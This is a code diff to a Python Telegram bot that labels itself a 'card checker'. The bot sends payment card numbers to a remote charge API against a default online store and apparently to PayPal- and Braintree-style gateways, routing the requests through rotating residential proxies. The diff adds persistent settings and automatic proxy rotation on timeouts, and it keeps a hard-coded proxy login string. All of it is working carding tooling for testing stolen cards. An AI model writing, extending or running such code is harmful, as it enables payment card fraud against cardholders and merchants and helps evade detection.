@@ -15,9 +15,10 @@ API_BASE_URL = "https://api.telegram.org/bot" + BOT_TOKEN
 # Example: TELEGRAM_PROXY = "http://127.0.0.1:7890"
 TELEGRAM_PROXY = None  # <-- Set your proxy here if Telegram is blocked
 
-# Default settings (using charge.py API)
-DEFAULT_SITE = "https://shelf-co.com"
-DEFAULT_PROXY = "geo.g-w.info:10080:user-P9tQgwy5zruWwzMa-type-residential-session-kxy6by9h-country-UK-rotation-15:3RpmDKUKGSdqJFJu"
+# Hard-coded fallback defaults (used only if config.json doesn't exist)
+_DEFAULT_SITE_FALLBACK = "https://shelf-co.com"
+_DEFAULT_PROXY_FALLBACK = "geo.g-w.info:10080:user-P9tQgwy5zruWwzMa-type-residential-session-kxy6by9h-country-UK-rotation-15:3RpmDKUKGSdqJFJu"
+
 API_ENDPOINT = "http://152.42.163.248/shopify.php"
 
 # Auto-delete delay in seconds (120 = 2 minutes)
@@ -32,6 +33,40 @@ user_settings = {}
 
 # Bot running state - admin can stop/start processing
 bot_running = True
+
+# ==================== PERSISTENT GLOBAL CONFIG ====================
+# Global default site & proxy are saved to config.json so they survive restarts/redeploys
+CONFIG_FILE = "config.json"
+_config_lock = threading.Lock()
+
+# In-memory globals (loaded from config.json on startup)
+DEFAULT_SITE = _DEFAULT_SITE_FALLBACK
+DEFAULT_PROXY = _DEFAULT_PROXY_FALLBACK
+
+def load_config():
+    """Load DEFAULT_SITE and DEFAULT_PROXY from config.json"""
+    global DEFAULT_SITE, DEFAULT_PROXY
+    if not os.path.exists(CONFIG_FILE):
+        return
+    try:
+        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
+            data = json.load(f)
+        with _config_lock:
+            DEFAULT_SITE = data.get("default_site", _DEFAULT_SITE_FALLBACK)
+            DEFAULT_PROXY = data.get("default_proxy", _DEFAULT_PROXY_FALLBACK)
+        print(f"[OK] Config loaded: site={DEFAULT_SITE[:50]}")
+    except Exception as e:
+        print(f"[WARN] Could not load config.json: {e}")
+
+def save_config():
+    """Save DEFAULT_SITE and DEFAULT_PROXY to config.json"""
+    with _config_lock:
+        data = {"default_site": DEFAULT_SITE, "default_proxy": DEFAULT_PROXY}
+    try:
+        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
+            json.dump(data, f, ensure_ascii=False, indent=2)
+    except Exception as e:
+        print(f"[WARN] Could not save config.json: {e}")
 
 # ==================== GLOBAL PROXY POOL ====================
 # Proxy pool is shared by ALL users and saved permanently to proxies.txt
@@ -275,22 +310,45 @@ def parse_card_input(line):
 def check_card(card_format, site, proxy):
     """Call API to check card via charge.py API (152.42.163.248).
     
-    If global proxy pool has proxies, pick one via round-robin (ignoring per-user proxy).
-    Otherwise fall back to the provided per-user proxy.
+    If global proxy pool has proxies, try each proxy via round-robin.
+    On timeout/connection error, automatically rotate to the next proxy.
+    Falls back to per-user proxy if pool is empty or all proxies fail.
     """
-    # Use proxy pool if available, otherwise use per-user proxy
-    pool_proxy = get_next_proxy()
-    effective_proxy = pool_proxy if pool_proxy else proxy
+    pool = get_proxy_pool()
 
-    full_url = f"{API_ENDPOINT}?site={site}&card={card_format}&proxy={effective_proxy}"
-
-    try:
-        response = requests.get(full_url, timeout=120)
-        return response.text.strip()
-    except requests.exceptions.Timeout:
-        return json.dumps({"response": "TIMEOUT", "price": "N/A"})
-    except requests.exceptions.RequestException as e:
-        return json.dumps({"response": f"CONNECTION_ERROR: {str(e)[:100]}", "price": "N/A"})
+    if pool:
+        # Try up to len(pool) proxies before giving up
+        attempts = min(len(pool), 5)  # max 5 retries across pool
+        last_error = None
+        for _ in range(attempts):
+            effective_proxy = get_next_proxy()
+            full_url = f"{API_ENDPOINT}?site={site}&card={card_format}&proxy={effective_proxy}"
+            try:
+                response = requests.get(full_url, timeout=120)
+                return response.text.strip()
+            except requests.exceptions.Timeout:
+                last_error = "TIMEOUT"
+                continue  # rotate to next proxy
+            except requests.exceptions.RequestException as e:
+                last_error = f"CONNECTION_ERROR: {str(e)[:80]}"
+                continue  # rotate to next proxy
+        # All pool proxies failed — try fallback
+        full_url = f"{API_ENDPOINT}?site={site}&card={card_format}&proxy={proxy}"
+        try:
+            response = requests.get(full_url, timeout=120)
+            return response.text.strip()
+        except Exception:
+            return json.dumps({"response": last_error or "ALL_PROXIES_FAILED", "price": "N/A"})
+    else:
+        # No pool — use per-user proxy directly
+        full_url = f"{API_ENDPOINT}?site={site}&card={card_format}&proxy={proxy}"
+        try:
+            response = requests.get(full_url, timeout=120)
+            return response.text.strip()
+        except requests.exceptions.Timeout:
+            return json.dumps({"response": "TIMEOUT", "price": "N/A"})
+        except requests.exceptions.RequestException as e:
+            return json.dumps({"response": f"CONNECTION_ERROR: {str(e)[:100]}", "price": "N/A"})
 
 def parse_response(response_text):
     """Parse response from API"""
@@ -1123,22 +1181,46 @@ def extract_cards_from_text(text, max_cards=20):
 def check_card_gateway(card_format, api_url):
     """Call a gateway API (pp or b3) and return parsed result dict.
     
-    If global proxy pool has proxies, append proxy param to URL via round-robin.
+    If global proxy pool has proxies, try each proxy via round-robin.
+    On timeout/connection error, automatically rotate to the next proxy.
+    Falls back to direct call (no proxy) if all pool proxies fail.
     """
-    # Use proxy pool if available
-    pool_proxy = get_next_proxy()
-    if pool_proxy:
-        url = api_url + card_format + f"&proxy={pool_proxy}"
+    pool = get_proxy_pool()
+    raw = None
+    last_error = None
+
+    if pool:
+        attempts = min(len(pool), 5)
+        for _ in range(attempts):
+            pool_proxy = get_next_proxy()
+            url = api_url + card_format + f"&proxy={pool_proxy}"
+            try:
+                response = requests.get(url, timeout=60)
+                raw = response.text.strip()
+                break  # success
+            except requests.exceptions.Timeout:
+                last_error = "TIMEOUT"
+                continue
+            except requests.exceptions.RequestException as e:
+                last_error = f"CONNECTION_ERROR: {str(e)[:80]}"
+                continue
+        if raw is None:
+            # All pool proxies failed — try without proxy as last resort
+            try:
+                response = requests.get(api_url + card_format, timeout=60)
+                raw = response.text.strip()
+            except Exception:
+                return {"status": "ERROR", "response": last_error or "ALL_PROXIES_FAILED", "raw": last_error or ""}
     else:
-        url = api_url + card_format
-    try:
-        response = requests.get(url, timeout=60)
-        raw = response.text.strip()
-    except requests.exceptions.Timeout:
-        return {"status": "ERROR", "response": "TIMEOUT", "raw": "TIMEOUT"}
-    except requests.exceptions.RequestException as e:
-        msg = f"CONNECTION_ERROR: {str(e)[:80]}"
-        return {"status": "ERROR", "response": msg, "raw": msg}
+        # No pool — direct call
+        try:
+            response = requests.get(api_url + card_format, timeout=60)
+            raw = response.text.strip()
+        except requests.exceptions.Timeout:
+            return {"status": "ERROR", "response": "TIMEOUT", "raw": "TIMEOUT"}
+        except requests.exceptions.RequestException as e:
+            msg = f"CONNECTION_ERROR: {str(e)[:80]}"
+            return {"status": "ERROR", "response": msg, "raw": msg}
 
     # Try to parse JSON
     try:
@@ -1369,7 +1451,7 @@ def handle_gateway_check(chat_id, user_id, text, user_name, user_msg_id, gateway
 # ==================== ADMIN COMMANDS ====================
 
 def handle_admin_defaultsite(chat_id, user_id, text, user_msg_id):
-    """Admin: /adefaultsite URL - change DEFAULT_SITE for ALL users (global)"""
+    """Admin: /adefaultsite URL - change DEFAULT_SITE for ALL users (global, saved permanently)"""
     global DEFAULT_SITE
     msg_ids_to_delete = [user_msg_id]
 
@@ -1384,7 +1466,8 @@ def handle_admin_defaultsite(chat_id, user_id, text, user_msg_id):
         msg_id = send_message(chat_id,
             f"❌ Usage: <code>/adefaultsite URL</code>\n\n"
             f"🌐 Current default: <code>{DEFAULT_SITE}</code>\n\n"
-            f"This changes the default site for ALL users who haven't set their own site."
+            f"This changes the default site for ALL users who haven't set their own site.\n"
+            f"💾 Saved permanently to config.json"
         )
         msg_ids_to_delete.append(msg_id)
         schedule_delete_multiple(chat_id, msg_ids_to_delete)
@@ -1396,6 +1479,7 @@ def handle_admin_defaultsite(chat_id, user_id, text, user_msg_id):
 
     old_site = DEFAULT_SITE
     DEFAULT_SITE = new_site
+    save_config()  # persist to config.json
 
     msg_id = send_message(chat_id,
         f"✅ <b>[ADMIN] Default site changed for ALL users!</b>\n"
@@ -1403,6 +1487,7 @@ def handle_admin_defaultsite(chat_id, user_id, text, user_msg_id):
         f"🔄 Old: <code>{old_site}</code>\n"
         f"🌐 New: <code>{DEFAULT_SITE}</code>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"💾 Saved permanently to config.json\n"
         f"⚠️ Users with custom /setsite are NOT affected.\n"
         f"👥 All other users will now use this site."
     )
@@ -1410,7 +1495,7 @@ def handle_admin_defaultsite(chat_id, user_id, text, user_msg_id):
     schedule_delete_multiple(chat_id, msg_ids_to_delete)
 
 def handle_admin_defaultproxy(chat_id, user_id, text, user_msg_id):
-    """Admin: /adefaultproxy proxy - change DEFAULT_PROXY for ALL users (global)"""
+    """Admin: /adefaultproxy proxy - change DEFAULT_PROXY for ALL users (global, saved permanently)"""
     global DEFAULT_PROXY
     msg_ids_to_delete = [user_msg_id]
 
@@ -1426,7 +1511,8 @@ def handle_admin_defaultproxy(chat_id, user_id, text, user_msg_id):
         msg_id = send_message(chat_id,
             f"❌ Usage: <code>/adefaultproxy proxy_string</code>\n\n"
             f"🔒 Current default: <code>{proxy_display}</code>\n\n"
-            f"This changes the default proxy for ALL users who haven't set their own proxy."
+            f"This changes the default proxy for ALL users who haven't set their own proxy.\n"
+            f"💾 Saved permanently to config.json"
         )
         msg_ids_to_delete.append(msg_id)
         schedule_delete_multiple(chat_id, msg_ids_to_delete)
@@ -1435,6 +1521,7 @@ def handle_admin_defaultproxy(chat_id, user_id, text, user_msg_id):
     new_proxy = parts[1].strip()
     old_proxy = DEFAULT_PROXY[:50] + "..." if len(DEFAULT_PROXY) > 50 else DEFAULT_PROXY
     DEFAULT_PROXY = new_proxy
+    save_config()  # persist to config.json
     new_proxy_display = new_proxy[:50] + "..." if len(new_proxy) > 50 else new_proxy
 
     msg_id = send_message(chat_id,
@@ -1443,6 +1530,7 @@ def handle_admin_defaultproxy(chat_id, user_id, text, user_msg_id):
         f"🔄 Old: <code>{old_proxy}</code>\n"
         f"🔒 New: <code>{new_proxy_display}</code>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"💾 Saved permanently to config.json\n"
         f"⚠️ Users with custom /setproxy are NOT affected.\n"
         f"👥 All other users will now use this proxy."
     )
@@ -2148,7 +2236,9 @@ def main():
     print("  TELEGRAM CARD CHECKER BOT")
     print("=" * 60)
 
-    # Load proxy pool from file on startup
+    # Load persistent config (DEFAULT_SITE, DEFAULT_PROXY) from config.json
+    load_config()
+    # Load proxy pool from proxies.txt
     load_proxy_pool()
 
     bot_info = get_bot_info()
